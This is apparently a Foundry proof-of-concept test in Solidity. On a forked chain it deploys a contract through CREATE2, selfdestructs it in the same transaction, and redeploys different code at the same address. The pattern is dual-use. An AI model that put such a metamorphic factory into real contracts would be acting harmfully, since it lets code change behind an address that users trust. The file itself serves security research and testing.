// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- CREATE2 metamorphic redeploy (same address, new code)
/// @notice A contract deployed via CREATE2 at a deterministic address can
///         be REPLACED with different code at the SAME address -- IF it
///         selfdestructs in the same transaction as its creation (post-
///         Cancun / EIP-6780, selfdestruct only deletes code same-tx).
///         Anyone trusting "this address is that code" is trusting a
///         mutable binding.
/// @dev FORK-ONLY (this PoC is self-contained -- it deploys its own factory
///      on the fork and proves the metamorphic pattern). Run via
///      scripts/run-fork-poc.sh. NOTE: the classic multi-tx metamorphic
///      (deploy, later selfdestruct, redeploy) is DEAD post-Cancun; the
///      same-tx factory path below is the live variant.

contract ImplV1 {
    function version() external pure returns (uint256) {
        return 1;
    }

    function kill() external {
        selfdestruct(payable(msg.sender));
    }
}

contract ImplV2 {
    function version() external pure returns (uint256) {
        return 2;
    }
}

contract MetamorphicFactory {
    // Deploys V1, selfdestructs it IN THE SAME TX (code deleted), then
    // deploys V2 at the SAME CREATE2 address with different code.
    function redeploy(bytes32 salt) external returns (address addr) {
        bytes memory codeV1 = type(ImplV1).creationCode;
        bytes memory codeV2 = type(ImplV2).creationCode;
        assembly {
            addr := create2(0, add(codeV1, 0x20), mload(codeV1), salt)
        }
        require(addr != address(0), "V1 deploy failed");
        ImplV1(addr).kill();
        assembly {
            addr := create2(0, add(codeV2, 0x20), mload(codeV2), salt)
        }
        require(addr != address(0), "V2 redeploy failed");
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        MetamorphicFactory factory = new MetamorphicFactory();
        bytes32 salt = bytes32(uint256(0xC0FFEE));

        // Same-tx redeploy: V1 deployed + destroyed, V2 at the same address.
        address addr = factory.redeploy(salt);
        uint256 version = ImplV2(addr).version();
        bytes32 codeHash;
        assembly {
            codeHash := extcodehash(addr)
        }
        console.log("redeployed address:", addr);
        console.log("code version at that address:", version);
        console.logBytes32(codeHash);
        assertEq(version, 2, "exploit did not reproduce: address does not hold V2 code");
    }
}
